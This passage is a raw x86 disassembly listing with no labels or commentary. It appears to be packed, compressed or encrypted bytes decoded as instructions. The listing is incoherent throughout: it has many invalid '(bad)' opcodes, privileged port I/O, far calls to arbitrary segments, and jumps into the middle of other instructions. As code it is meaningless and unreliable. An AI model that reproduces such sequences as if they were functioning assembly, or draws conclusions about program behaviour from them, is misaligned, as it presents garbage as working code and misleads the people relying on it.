  412796:	xor    BYTE PTR [ebx+0x362aec15],bl
  41279c:	pop    esp
  41279d:	jbe    0x412768
  41279f:	dec    ebx
  4127a0:	call   0xf24de0e5
  4127a5:	and    ecx,DWORD PTR [eax+ebx*1+0x8]
  4127a9:	in     al,0xac
  4127ab:	jecxz  0x41275e
  4127ad:	js     0x41280f
  4127af:	push   esp
  4127b0:	popf   
  4127b1:	mov    edi,0x658c5188
  4127b6:	jg     0x4127a6
  4127b8:	push   edi
  4127b9:	push   ecx
  4127ba:	or     DWORD PTR [ecx],ebx
  4127bc:	jmp    0xd1e:0x7aa65fc9
  4127c3:	cmc    
  4127c4:	mov    edi,0x40bb7445
  4127c9:	dec    ecx
  4127ca:	cmp    esp,DWORD PTR [si+0x3a]
  4127ce:	push   ecx
  4127cf:	push   ss
  4127d0:	mov    ds:0x11f49631,al
  4127d5:	(bad)  
  4127d6:	push   esp
  4127d7:	jno    0x412776
  4127d9:	icebp  
  4127da:	jno    0x4127b3
  4127dc:	cmp    DWORD PTR [esi+0x3f215451],edi
  4127e2:	mov    ebx,0x20911538
  4127e7:	icebp  
  4127e8:	cmp    DWORD PTR [ebx+eax*8+0x14],eax
  4127ec:	jns    0x41283f
  4127ee:	pop    ebp
  4127ef:	scas   eax,DWORD PTR es:[edi]
  4127f0:	bound  ebp,QWORD PTR [ecx]
  4127f2:	lock sahf 
  4127f4:	jo     0x41277e
  4127f6:	mov    esp,0x632add63
  4127fb:	xor    ecx,DWORD PTR ds:0x1aca6ee8
  412801:	jmp    0x412793
  412803:	das    
  412804:	(bad)  
  412805:	pop    eax
  412806:	sbb    bl,BYTE PTR [ebx]
  412808:	jb     0x412811
  41280a:	out    0xae,eax
  41280c:	xlat   BYTE PTR ds:[ebx]
  41280d:	push   cs
  41280e:	neg    ah
  412810:	pop    eax
  412811:	xchg   esp,eax
  412812:	fisttp QWORD PTR [ebx-0x32]
  412815:	ss hlt 
  412817:	jnp    0x412824
  412819:	sub    eax,0x47e2412b
  41281e:	or     ebp,DWORD PTR [eax+eax*4]
  412821:	and    eax,0xe8fb3316
  412826:	add    ebx,0xffffffdd
  412829:	jle    0x412878
  41282b:	repz push ecx
  41282d:	xchg   edx,eax
  41282e:	pop    ss
  41282f:	outs   dx,DWORD PTR ds:[esi]
  412830:	and    eax,0x459c581
  412835:	jp     0x412854
  412837:	jmp    0x412829
  412839:	push   edx
  41283a:	xor    al,cl
  41283c:	repz add BYTE PTR [ebx+eiz*4],0xb1
  412841:	add    BYTE PTR [eax+ebp*4-0x62312beb],cl
  412848:	mov    gs,ebx
  41284a:	test   BYTE PTR [edi-0x6f8fa9b6],dl
  412850:	mov    esp,DWORD PTR [esi]
  412852:	add    BYTE PTR ds:0xa6c0e73a,bh
  412858:	fcmovb st,st(0)
  41285a:	std    
  41285b:	jge    0x412896
  41285d:	inc    edi
  41285e:	xchg   DWORD PTR [edx+0x2a],esp
  412861:	jns    0x4128c5
  412863:	xchg   esi,eax
  412864:	xchg   edx,eax
  412865:	sar    BYTE PTR [ebx+0x53],cl
  412868:	shl    DWORD PTR [edi-0x6a9e2fc3],cl
  41286e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41286f:	pusha  
  412870:	jnp    0x4128a3
  412872:	popa   
  412873:	cmp    DWORD PTR [edx+0x611fffe9],esi
  412879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41287a:	sbb    al,0x38
  41287c:	jl     0x4128cf
  41287e:	sub    eax,0x8d52f7bc
  412883:	nop
  412884:	imul   BYTE PTR [edx-0x650aab07]
  41288a:	mov    DWORD PTR [eax-0x4ac135cd],esp
  412890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412891:	xchg   esp,eax
  412892:	retf   0x4c86
  412895:	sub    eax,0xfb8354f3
  41289a:	xlat   BYTE PTR ds:[ebx]
  41289b:	xor    al,0xd1
  41289d:	mov    bh,0x84
  41289f:	enter  0xc4e2,0xd4
  4128a3:	xchg   ebp,eax
  4128a4:	lods   al,BYTE PTR ds:[esi]
  4128a5:	outs   dx,BYTE PTR ds:[si]
  4128a7:	sbb    BYTE PTR [ecx-0x27],al
  4128aa:	xchg   edx,eax
  4128ab:	in     eax,dx
  4128ac:	(bad)  
  4128ad:	mov    gs,WORD PTR [edx+esi*1]
  4128b0:	dec    ebp
  4128b1:	jl     0x41285d
  4128b3:	popa   
  4128b4:	dec    eax
  4128b5:	xchg   ebx,eax
  4128b6:	(bad)  
  4128b8:	int    0xa5
  4128ba:	ja     0x4128d3
  4128bc:	das    
  4128bd:	sbb    eax,0x84424781
  4128c2:	xor    eax,DWORD PTR [edx]
  4128c4:	stos   BYTE PTR es:[edi],al
  4128c5:	retf   0x9f9b
  4128c8:	outs   dx,BYTE PTR ds:[esi]
  4128c9:	lods   al,BYTE PTR ds:[esi]
  4128ca:	inc    ecx
  4128cb:	std    
  4128cc:	mov    ds,WORD PTR [ebx+0x48706d4]
  4128d2:	xchg   ebx,eax
  4128d3:	or     BYTE PTR [edx+0x76],cl
  4128d6:	add    eax,DWORD PTR cs:[esi-0x2]
  4128da:	sbb    BYTE PTR [ebx],bl
  4128dc:	pop    edi
  4128dd:	shl    cl,cl
  4128df:	(bad)  
  4128e0:	std    
  4128e1:	cmp    ax,0x50cf
  4128e5:	(bad)  
  4128e6:	push   ebx
  4128e7:	xor    dl,BYTE PTR [edi+0x57]
  4128ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128eb:	add    al,0x12
  4128ed:	out    dx,eax
  4128ee:	sahf   
  4128ef:	or     eax,0xa2ad93c7
  4128f4:	shl    BYTE PTR [eax+0x724a0e0f],0xac
  4128fb:	jb     0x41291c
  4128fd:	mov    ds:0x2063eed7,al
  412902:	push   edi
  412903:	mov    BYTE PTR [esi],cl
  412905:	pop    esi
  412906:	add    bh,dh
  412908:	mov    ah,0x4
  41290a:	adc    eax,0xa934e106
  41290f:	mov    bl,0xb8
  412911:	arpl   WORD PTR [ebx+esi*8-0x1f8e9a88],cx
  412918:	and    BYTE PTR [eax+0x36],0x8a
  41291c:	xor    eax,0x8e163b1f
  412921:	fwait
  412922:	aad    0xd2
  412924:	adc    ebx,DWORD PTR [ebx-0x234898b2]
  41292a:	(bad)  
  41292b:	adc    al,0xef
  41292d:	scas   eax,DWORD PTR es:[edi]
  41292e:	add    BYTE PTR [ecx-0x1e],bl
  412931:	sahf   
  412932:	sub    ebx,DWORD PTR [ebx+0x20]
  412935:	sbb    eax,DWORD PTR [eax+0x515daa25]
  41293b:	dec    eax
  41293c:	aas    
  41293d:	mov    WORD PTR [edi+0x23d9628d],ss
  412943:	(bad)  
  412944:	loope  0x4128fc
  412946:	xchg   BYTE PTR [ebx+eax*2],bh
  412949:	or     al,0x7d
  41294b:	mov    dl,0x4b
  41294d:	adc    edi,ebx
  41294f:	push   cs
  412950:	in     al,0x98
  412952:	or     BYTE PTR [ecx+eiz*4+0xd],dh
  412956:	sub    al,0x19
  412958:	jns    0x41294d
  41295a:	mov    eax,ds:0xf8ebf5a5
  41295f:	xor    ecx,DWORD PTR [esi-0x18]
  412962:	inc    esi
  412963:	push   edi
  412964:	jmp    0x4129be
  412966:	fucomip st,st(3)
  412968:	push   ss
  412969:	cmp    al,ch
  41296b:	leave  
  41296c:	inc    edi
  41296d:	ror    DWORD PTR [edi+esi*4-0x7f43c221],cl
  412974:	push   cs
  412975:	or     BYTE PTR [ebp*2-0x56c10aa4],bh
  41297c:	bound  esi,QWORD PTR [ebx-0x68]
  41297f:	add    esp,edi
  412981:	and    BYTE PTR [eax-0x4a1e2a1c],0x60
  412988:	out    dx,al
  412989:	pop    es
  41298a:	shl    DWORD PTR [ecx+0x3e6f1ce0],1
  412990:	push   ecx
  412991:	pusha  
  412992:	push   ebp
  412993:	sahf   
  412994:	lods   eax,DWORD PTR ds:[esi]
  412995:	mov    ah,0x25
  412997:	bound  ecx,QWORD PTR [eax]
  412999:	adc    ecx,eax
  41299b:	fild   WORD PTR [esi+0x6b]
  41299e:	clc    
  41299f:	mov    dl,0x93
  4129a1:	and    edx,DWORD PTR [edx]
  4129a3:	and    eax,0xc7f8b3ed
  4129a8:	mov    ecx,0xa2c1f039
  4129ad:	cli    
  4129ae:	xor    al,BYTE PTR [esi]
  4129b0:	adc    cl,BYTE PTR [esi-0x750088a8]
  4129b6:	imul   ecx,esi,0x38
  4129b9:	addr16 hlt 
  4129bb:	lock rol bh,1
  4129be:	ror    DWORD PTR [esi*2-0x43bd0240],0x2a
  4129c6:	inc    ebp
  4129c7:	inc    esp
  4129c8:	adc    ah,al
  4129ca:	dec    ecx
  4129cb:	ret    0x9d70
  4129ce:	fcmove st,st(5)
  4129d0:	rcl    DWORD PTR fs:[edx+0x6e],cl
  4129d4:	xor    cl,BYTE PTR [ebp-0xc]
  4129d7:	mov    ecx,edx
  4129d9:	push   ebp
  4129da:	sub    dh,BYTE PTR [eax-0x37]
  4129dd:	or     BYTE PTR fs:[esi+ebx*8],dl
  4129e1:	sbb    BYTE PTR [ebx-0x74e04ba1],bl
  4129e7:	pop    esp
  4129e8:	popa   
  4129e9:	mov    DWORD PTR [ebp+0x4dd429a2],edi
  4129ef:	enter  0x1988,0x1c
  4129f3:	sahf   
  4129f4:	popa   
  4129f5:	or     al,0x32
  4129f7:	test   al,0x73
  4129f9:	sbb    eax,0x6aa5783a
  4129fe:	scas   eax,DWORD PTR es:[edi]
  4129ff:	sar    ah,1
  412a01:	pop    esp
  412a02:	add    ecx,edx
  412a04:	outs   dx,BYTE PTR ds:[esi]
  412a05:	mov    bh,0x51
  412a07:	mov    dl,0x97
  412a09:	in     eax,dx
  412a0a:	dec    esi
  412a0b:	add    ecx,ebp
  412a0d:	dec    ecx
  412a0e:	xchg   ebx,eax
  412a0f:	cmp    ah,dh
  412a11:	dec    eax
  412a12:	es xor ch,bl
  412a15:	test   BYTE PTR [edi+0x4fec2f2],dh
  412a1b:	stos   BYTE PTR es:[edi],al
  412a1c:	cmp    ecx,edi
  412a1e:	scas   eax,DWORD PTR es:[edi]
  412a1f:	mov    ebx,DWORD PTR [edi-0x23]
  412a22:	(bad)  
  412a23:	lahf   
  412a24:	ja     0x4129f1
  412a26:	ins    DWORD PTR es:[edi],dx
  412a27:	push   cs
  412a28:	gs icebp 
  412a2a:	fsub   QWORD PTR [edi]
  412a2c:	outs   dx,BYTE PTR ds:[esi]
  412a2d:	arpl   WORD PTR [esi],sp
  412a2f:	mov    bl,0x7a
  412a31:	xchg   ecx,eax
  412a32:	out    0x17,eax
  412a34:	adc    DWORD PTR [ebp+0x6f2b4a77],ebp
  412a3a:	and    eax,0x514de3b6
  412a3f:	jmp    0xddd57135
  412a44:	mov    edx,0x1b734620
  412a49:	sar    ecx,cl
  412a4b:	add    dh,BYTE PTR [eax]
  412a4d:	rcr    BYTE PTR [ebx+0x2e16b742],0x62
  412a54:	push   0x59
  412a56:	push   es
  412a57:	sub    dl,BYTE PTR [ebp-0x6211973a]
  412a5d:	sub    edi,DWORD PTR [edx+0x71]
  412a60:	cmovle ecx,DWORD PTR [ebx]
  412a63:	pop    ss
  412a64:	sub    ebp,edx
  412a66:	mov    edi,0x58df7150
  412a6b:	(bad)  
  412a6c:	fwait
  412a6d:	jecxz  0x412a53
  412a6f:	mov    ds:0x825dd861,al
  412a74:	xchg   esp,eax
  412a75:	cmc    
  412a76:	pop    eax
  412a77:	sti    
  412a78:	inc    ecx
  412a79:	add    cl,0x17
  412a7c:	cwde   
  412a7d:	and    eax,DWORD PTR [ebp+0x29b5c746]
  412a83:	adc    DWORD PTR [eax+0xf],edi
  412a86:	rcl    DWORD PTR [edx],cl
  412a88:	adc    al,0xe6
  412a8a:	pop    edi
  412a8b:	into   
  412a8c:	pop    edi
  412a8d:	popf   
  412a8e:	(bad)  
  412a90:	(bad)  
  412a91:	loope  0x412a3a
  412a93:	in     al,dx
  412a94:	jne    0x412aa9
  412a96:	dec    ecx
  412a97:	sbb    dh,BYTE PTR [edi]
  412a99:	popa   
  412a9a:	daa    
  412a9b:	je     0x412af3
  412a9d:	in     al,dx
  412a9e:	loope  0x412ab8
  412aa0:	cwde   
  412aa1:	xchg   esi,eax
  412aa2:	cmp    dh,BYTE PTR [edx-0x25]
  412aa5:	xchg   edi,eax
  412aa6:	shr    DWORD PTR [edx+0x43f06bef],cl
  412aac:	js     0x412ad3
  412aae:	(bad)  
  412aaf:	shl    BYTE PTR cs:[ebp-0x3a],0xdd
  412ab4:	jno    0x412b26
  412ab6:	out    0x6c,eax
  412ab8:	aas    
  412ab9:	add    ch,dh
  412abb:	sbb    esi,DWORD PTR [edx-0x1b]
  412abe:	mov    ebx,0xa8c7264d
  412ac3:	mov    al,ds:0x6aabd0e7
  412ac8:	(bad)  
  412ac9:	fsubr  DWORD PTR [esi-0x6be7f742]
  412acf:	sar    BYTE PTR ds:0xf22c8a95,1
  412ad5:	jb     0x412abf
  412ad7:	mov    eax,ds:0xc5c316c5
  412adc:	jge    0x412af9
  412ade:	jle    0x412b57
  412ae0:	sub    BYTE PTR es:[eax-0x51],dh
  412ae4:	ss pop ebp
  412ae6:	out    dx,eax
  412ae7:	cmc    
  412ae8:	inc    ebx
  412ae9:	iret   
  412aea:	hlt    
  412aeb:	adc    DWORD PTR [esp+ecx*2],edx
  412aee:	sbb    BYTE PTR [edx-0x4aa9a245],ch
  412af4:	and    cl,BYTE PTR [eax+0x2f]
  412af7:	popf   
  412af8:	iret   
  412af9:	inc    edx
  412afa:	dec    edx
  412afb:	(bad)  
  412afc:	(bad)  
  412afd:	fld    DWORD PTR [esi+edx*1-0x35]
  412b01:	inc    ecx
  412b02:	test   eax,0xb502e244
  412b07:	ins    DWORD PTR es:[edi],dx
  412b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b09:	out    0x5d,eax
  412b0b:	and    bh,BYTE PTR [eax-0x41c1744a]
  412b11:	xchg   esp,eax
  412b12:	sub    DWORD PTR [eax],edi
  412b14:	jp     0x412b2a
  412b16:	add    BYTE PTR [ecx-0x8bcf311],dh
  412b1c:	mov    ds:0x9647554d,al
  412b21:	in     al,dx
  412b22:	(bad)  [ebp+0x22]
  412b25:	and    esp,edx
  412b27:	xchg   esp,eax
  412b28:	fmul   st,st(0)
  412b2a:	adc    BYTE PTR [ecx-0x21],cl
  412b2d:	inc    ebp
  412b2e:	sahf   
  412b2f:	xchg   ecx,eax
  412b30:	sbb    DWORD PTR [edx],0xffffffc0
  412b33:	pushf  
  412b34:	mov    DWORD PTR [ebx+ebx*4-0x58d3e346],edi
  412b3b:	dec    edx
  412b3c:	es leave 
  412b3e:	hlt    
  412b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b40:	inc    eax
  412b41:	cmp    al,0x75
  412b43:	call   0xb6c880a0
  412b48:	and    al,0x2d
  412b4a:	push   0xdc1d4d11
  412b4f:	xchg   ebx,eax
  412b50:	cmp    eax,0xb56321f4
  412b55:	inc    esi
  412b56:	scas   eax,DWORD PTR es:[edi]
  412b57:	jge    0x412ba8
  412b59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b5a:	dec    esi
  412b5b:	hlt    
  412b5c:	inc    edx
  412b5d:	or     eax,0xc70d3375
  412b62:	pusha  
  412b63:	and    edx,esp
  412b65:	in     eax,0xc4
  412b67:	mov    esi,0xdf86e419
  412b6c:	pusha  
  412b6d:	into   
  412b6e:	mov    ch,0x3
  412b70:	jp     0x412baa
  412b72:	cdq    
  412b73:	nop
  412b74:	push   ebp
  412b75:	loope  0x412bd9
  412b77:	lahf   
  412b78:	aaa    
  412b79:	inc    ebx
  412b7a:	les    ecx,FWORD PTR [ebx]
  412b7c:	xchg   BYTE PTR [ebx-0x157b8828],al
  412b82:	cs pop ebx
  412b84:	cs cld 
  412b86:	jmp    0x412b8c
  412b88:	inc    eax
  412b89:	jns    0x412bba
  412b8b:	dec    ebx
  412b8c:	push   ebx
  412b8d:	mov    edi,0x84ef9c17
  412b92:	or     ch,BYTE PTR [eax]
  412b94:	mov    esi,0xce9539c6
  412b99:	jge    0x412b83
  412b9b:	adc    ch,ah
  412b9d:	lds    eax,FWORD PTR [ebp+0x32b2f75]
  412ba3:	inc    esi
  412ba4:	cdq    
  412ba5:	ror    BYTE PTR [edi],0x70
  412ba8:	sbb    DWORD PTR [esi-0x6c9be082],0x79c26aac
  412bb2:	pusha  
  412bb3:	call   0xdaee:0x41653e55
  412bba:	mov    edx,0xa52b477
  412bbf:	test   al,0x91
  412bc1:	add    DWORD PTR [esi],esp
  412bc3:	mov    eax,0x1cd4bb9e
  412bc8:	popa   
  412bc9:	mov    edi,gs
  412bcb:	sub    edi,esi
  412bcd:	shl    BYTE PTR [ebp+0x56],1
  412bd0:	add    edi,DWORD PTR [ecx+0xf]
  412bd3:	dec    esp
  412bd4:	xchg   ebp,eax
  412bd5:	mov    cl,0x2d
  412bd7:	scas   al,BYTE PTR es:[edi]
  412bd8:	ins    DWORD PTR es:[edi],dx
  412bd9:	mov    ebp,DWORD PTR [edi-0x17]
  412bdc:	mov    eax,0xf7c72dde
  412be1:	nop
  412be2:	xchg   DWORD PTR [ecx],ebx
  412be4:	jle    0x412c33
  412be6:	cs sbb eax,edi
  412be9:	mov    bh,0x78
  412beb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bec:	pop    ebp
  412bed:	push   esi
  412bee:	rol    BYTE PTR [ebx],cl
  412bf0:	lods   al,BYTE PTR ds:[esi]
  412bf1:	aam    0xfd
  412bf3:	push   0x9fdbf528
  412bf8:	pop    ebp
  412bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bfa:	push   eax
  412bfb:	pop    esp
  412bfc:	sub    ebp,edx
  412bfe:	inc    eax
  412bff:	call   0xbd2c:0xdc24015c
  412c06:	sti    
  412c07:	mov    edi,0x810d7bea
  412c0c:	loop   0x412c0a
  412c0e:	call   0xe6a5b1e6
  412c13:	xchg   esi,eax
  412c14:	gs pop esi
  412c16:	fsubr  DWORD PTR [edx+ecx*4-0x2ff7f88e]
  412c1d:	rcl    DWORD PTR [eax+esi*4],0x86
  412c21:	push   esp
  412c22:	test   BYTE PTR [esi-0x34],bh
  412c25:	shr    BYTE PTR [eax],1
  412c27:	repnz add dl,BYTE PTR [ebx-0x4]
  412c2b:	jno    0x412c44
  412c2d:	mov    dl,0x28
  412c2f:	inc    esi
  412c30:	lahf   
  412c31:	call   0x4113:0xcd245d05
  412c38:	sub    edi,DWORD PTR [ebx-0x7f]
  412c3b:	mov    ebp,0x5bf564ee
  412c40:	cmp    cl,ah
  412c42:	in     al,dx
  412c43:	test   al,0xbe
  412c45:	imul   esp,ebx,0x7a
  412c48:	mov    esi,0xd166960b
  412c4d:	mov    ecx,0xc6660eae
  412c52:	inc    edx
  412c53:	pop    ecx
  412c54:	pop    ds
  412c55:	mov    dh,0xe7
  412c57:	jb     0x412c43
  412c59:	pop    es
  412c5a:	cmp    al,0xa
  412c5c:	inc    esi
  412c5d:	mov    ebp,0x7c964a73
  412c62:	popw   ss
  412c64:	(bad)  
  412c65:	xchg   edi,eax
  412c66:	jg     0x412ca6
  412c68:	inc    edx
  412c69:	cli    
  412c6a:	cwde   
  412c6b:	stos   BYTE PTR es:[edi],al
  412c6c:	push   ds
  412c6d:	xor    cx,WORD PTR [eax+ecx*8-0x2c]
  412c72:	mov    fs,ebx
  412c74:	pusha  
  412c75:	sub    bl,BYTE PTR [eax]
  412c77:	inc    esp
  412c78:	pop    edi
  412c79:	mov    edx,0x9db22d0a
  412c7e:	sahf   
  412c7f:	(bad)  
  412c80:	jp     0x412cef
  412c82:	xchg   ebp,eax
  412c83:	fwait
  412c84:	adc    BYTE PTR [esi],cl
  412c86:	shl    DWORD PTR es:[ebp+0x77],0x8e
  412c8b:	push   0xef18f150
  412c90:	sub    al,0xe0
  412c92:	mov    ds:0xe4be0e47,al
  412c97:	mov    al,ds:0x683e3414
  412c9c:	mov    WORD PTR [ebp+eax*4+0x258ea26c],es
  412ca3:	cld    
  412ca4:	es cdq 
  412ca6:	or     eax,0xcfacc251
  412cab:	or     ebx,DWORD PTR [edi+0x1b]
  412cae:	push   0xb
  412cb0:	and    dl,dl
  412cb2:	xor    BYTE PTR [eax],dl
  412cb4:	sub    ch,ah
  412cb6:	inc    esi
  412cb7:	mov    cl,0x9a
  412cb9:	(bad)  
  412cba:	scas   al,BYTE PTR es:[edi]
  412cbb:	sbb    ebp,ebx
  412cbd:	in     eax,0x75
  412cbf:	lock inc edi
  412cc1:	shl    DWORD PTR [esi+0x66],cl
  412cc4:	fwait
  412cc5:	dec    esp
  412cc6:	mov    ah,0xae
  412cc8:	fsub   st,st(4)
  412cca:	pop    es
  412ccb:	rcr    BYTE PTR [eax],cl
  412ccd:	add    al,0xfe
  412ccf:	lods   al,BYTE PTR ds:[esi]
  412cd0:	push   ecx
  412cd1:	xor    bl,BYTE PTR [edx]
  412cd3:	pushf  
  412cd4:	out    dx,eax
  412cd5:	fisubr DWORD PTR [ebx]
  412cd7:	(bad)  
  412cd9:	dec    esp
  412cda:	dec    ebx
  412cdb:	out    0xfc,al
  412cdd:	in     eax,dx
  412cde:	inc    edx
  412cdf:	mov    edi,0x523e4f5a
  412ce4:	sbb    BYTE PTR [ebx+0x21878df0],dh
  412cea:	add    BYTE PTR [esp+edi*1-0x1aa3c9fe],cl
  412cf1:	or     ebx,ecx
  412cf3:	fadd   st,st(3)
  412cf5:	mov    ebp,0xd429940a
  412cfa:	stc    
  412cfb:	repz pop edi
  412cfd:	pushf  
  412cfe:	sahf   
  412cff:	fbld   TBYTE PTR [esi+0x6cdab115]
  412d05:	das    
  412d06:	cmp    BYTE PTR ds:0x8b760304,ch
  412d0c:	fcomp  QWORD PTR gs:[ecx+0x77]
  412d10:	cmp    BYTE PTR [edi+0x675c249f],bl
  412d16:	mov    BYTE PTR [edx-0x51],al
  412d19:	clc    
  412d1a:	in     al,0x55
  412d1c:	and    BYTE PTR ds:0xf94393aa,al
  412d22:	mov    eax,ds:0xa6d420ce
  412d27:	scas   al,BYTE PTR es:[edi]
  412d28:	pop    ebp
  412d29:	popf   
  412d2a:	test   eax,0x6a95d224
  412d2f:	repnz aaa 
  412d31:	cdq    
  412d32:	mov    al,ah
  412d34:	test   dl,ah
  412d36:	(bad)  
  412d37:	shr    DWORD PTR ds:0xfb37dd92,0x48
  412d3e:	pop    eax
  412d3f:	mov    eax,0x4ed08373
  412d44:	js     0x412d3f
  412d46:	push   ecx
  412d47:	dec    edi
  412d48:	je     0x412d74
  412d4a:	cmp    al,0x22
  412d4c:	mov    bh,0xe0
  412d4e:	pop    ss
  412d4f:	scas   al,BYTE PTR es:[edi]
  412d50:	pusha  
  412d51:	cdq    
  412d52:	call   0xa8c501a9
  412d57:	loope  0x412dca
  412d59:	and    BYTE PTR [ebx+0x321e3bca],dh
  412d5f:	test   al,0x98
  412d61:	in     eax,0x16
  412d63:	mov    ?,WORD PTR [eax]
  412d65:	pop    eax
  412d66:	dec    edx
  412d67:	push   esi
  412d68:	outs   dx,BYTE PTR ds:[esi]
  412d69:	aam    0x8f
  412d6b:	cdq    
  412d6c:	inc    esp
  412d6d:	int    0xfc
  412d6f:	jg     0x412ddf
  412d71:	iret   
  412d72:	push   ecx
  412d73:	out    0x16,eax
  412d75:	sahf   
  412d76:	aas    
  412d77:	or     BYTE PTR [eax-0x75f951da],ah
  412d7d:	adc    ebp,ecx
  412d7f:	xchg   edx,eax
  412d80:	cmp    dl,ch
  412d82:	lock and eax,0x56840c63
  412d88:	repz dec esp
  412d8a:	or     DWORD PTR [ebp-0x7f],esp
  412d8d:	and    al,0xa1
  412d8f:	lods   eax,DWORD PTR ds:[esi]
  412d90:	push   0xffffffbe
  412d92:	int3   
  412d93:	jle    0x412d36
  412d95:	push   edi
  412d96:	sub    BYTE PTR [edx],bh
  412d98:	xor    DWORD PTR [eax+0xddf8385],ecx
  412d9e:	inc    edi
  412d9f:	push   esi
  412da0:	xor    al,0x39
  412da2:	fisttp QWORD PTR [edi+0x643d56b2]
  412da8:	(bad)
  412dac:	xor    eax,DWORD PTR [ebp-0x6a]
  412daf:	test   DWORD PTR [edx-0x50],0x5f003eb
  412db6:	mov    esp,0x59d4d987
  412dbb:	cmp    BYTE PTR [ebx+edx*2+0x1],ah
  412dbf:	adc    al,0x8d
  412dc1:	mov    dl,0xe8
  412dc3:	mov    ss,WORD PTR [ecx+0x73]
  412dc6:	mov    esi,0x8720a8db
  412dcb:	push   es
  412dcc:	mov    ecx,0x3cbfed1a
  412dd1:	jne    0x412de9
  412dd3:	cs sbb BYTE PTR cs:[eax],ch
  412dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dd8:	out    0xbd,eax
  412dda:	ins    DWORD PTR es:[edi],dx
  412ddb:	sub    esi,DWORD PTR ds:0x7cb6d245
  412de1:	rcr    BYTE PTR [ebx-0x7dd72c68],0xc8
  412de8:	or     DWORD PTR [esi+0x4a],eax
  412deb:	jmp    DWORD PTR [ebx+edx*8]
  412dee:	addr16 sahf 
  412df0:	jo     0x412d98
  412df2:	cdq    
  412df3:	inc    edx
  412df4:	push   ebx
  412df5:	or     ebx,ecx
  412df7:	inc    esp
  412df8:	cmp    BYTE PTR [edi],al
  412dfa:	add    al,cl
  412dfc:	ins    DWORD PTR es:[edi],dx
  412dfd:	or     al,0x12
  412dff:	pop    es
  412e00:	pop    DWORD PTR [eax]
  412e02:	mov    edi,0x4c8c222c
  412e07:	add    ch,BYTE PTR [edx+0x48]
  412e0a:	pop    bx
  412e0c:	and    esp,esp
  412e0e:	push   ds
  412e0f:	not    DWORD PTR [edx-0x6f]
  412e12:	pushf  
  412e13:	cmp    al,0xce
  412e15:	cmp    DWORD PTR ds:0xed58cbc6,ecx
  412e1b:	push   0xffffffa2
  412e1d:	adc    dh,BYTE PTR [ebp-0x4f]
  412e20:	imul   edx,DWORD PTR [edi],0x81290a7d
  412e26:	retf   0xbb71
  412e29:	repnz (bad) [eax]
  412e2c:	xor    DWORD PTR [esi],eax
  412e2e:	std    
  412e2f:	loop   0x412dd5
  412e31:	test   DWORD PTR [ebx+0x199b8f8],edi
  412e37:	hlt    
  412e38:	data16 ds and al,0x5c
  412e3c:	imul   ebx,eax,0xffffffde
  412e3f:	int    0xea
  412e41:	pop    ds
  412e42:	nop
  412e43:	lahf   
  412e44:	sti    
  412e45:	mov    DWORD PTR [ebx],ebx
  412e47:	mov    ch,0x80
  412e49:	aaa    
  412e4a:	std    
  412e4b:	aaa    
  412e4c:	ficom  DWORD PTR [eax]
  412e4e:	mov    ?,WORD PTR [edi+esi*1]
  412e51:	shl    BYTE PTR [ecx+0x2bf06208],1
  412e57:	dec    eax
  412e58:	xchg   edi,eax
  412e59:	xchg   esp,eax
  412e5a:	mov    bl,0x14
  412e5c:	test   eax,0x38c5e80b
  412e61:	inc    esp
  412e62:	jae    0x412e71
  412e64:	xchg   edi,eax
  412e65:	jge    0x412ee5
  412e67:	fucomi st,st(5)
  412e69:	xor    DWORD PTR [esi+0x4d],edx
  412e6c:	mov    edi,0xfe0a4fc0
  412e71:	pop    ss
  412e72:	cmp    ecx,DWORD PTR [edi-0x2544a00d]
  412e78:	popa   
  412e79:	mov    WORD PTR [edx*8-0x1e08fa9d],gs
  412e80:	cmp    ecx,DWORD PTR [edi-0x41473453]
  412e86:	xor    edx,DWORD PTR [ebx]
  412e88:	mov    dh,0x15
  412e8a:	mov    bl,0x99
  412e8c:	jg     0x412e5a
  412e8e:	aam    0xa3
  412e90:	sbb    bl,dh
  412e92:	js     0x412e86
  412e94:	push   ss
  412e95:	jo     0x412e9f
  412e97:	push   esp
  412e98:	popf   
  412e99:	ss push ebx
  412e9b:	push   ss
  412e9c:	into   
  412e9d:	inc    edi
  412e9e:	sub    al,0x14
  412ea0:	push   0xffffff98
  412ea2:	pop    edi
  412ea3:	ror    DWORD PTR [edi+0x3c5abd17],0x74
  412eaa:	pop    ebx
  412eab:	jae    0x412f00
  412ead:	push   ss
  412eae:	xor    DWORD PTR [edx+0x30],ebp
  412eb1:	push   es
  412eb2:	sbb    al,BYTE PTR [edx+0x1ee373d9]
  412eb8:	xor    BYTE PTR [eax+edi*8],bl
  412ebb:	mov    ds:0x7294c59b,al
  412ec0:	shl    dh,cl
  412ec2:	dec    ebx
  412ec3:	jno    0x412ee3
  412ec5:	retf   
  412ec6:	inc    ebx
  412ec7:	mov    bl,0xce
  412ec9:	dec    esi
  412eca:	in     eax,0xf0
  412ecc:	push   es
  412ecd:	jb     0x412f3d
  412ecf:	cmp    ch,BYTE PTR [edx-0x12e467ac]
  412ed5:	sbb    al,0x37
  412ed7:	mov    ch,0x33
  412ed9:	add    eax,0xd5d629b
  412ede:	ror    cl,1
  412ee0:	es (bad) 
  412ee2:	inc    edi
  412ee3:	(bad)  
  412ee5:	xlat   BYTE PTR ds:[ebx]
  412ee6:	adc    ebp,DWORD PTR ds:0xf4fc6e20
  412eec:	les    ebp,FWORD PTR [ebx-0x4f]
  412eef:	scas   al,BYTE PTR es:[edi]
  412ef0:	lds    eax,FWORD PTR [ebx]
  412ef2:	fwait
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	clc    
  412ef5:	rcr    BYTE PTR [esi],cl
  412ef7:	daa    
  412ef8:	shl    DWORD PTR [ebp-0x1],cl
  412efb:	outs   dx,BYTE PTR ds:[esi]
  412efc:	outs   dx,BYTE PTR ds:[esi]
  412efd:	retf   
  412efe:	std    
  412eff:	popf   
  412f00:	nop
  412f01:	xor    edi,DWORD PTR [eax]
  412f03:	out    0x18,eax
  412f05:	pop    esi
  412f06:	out    dx,al
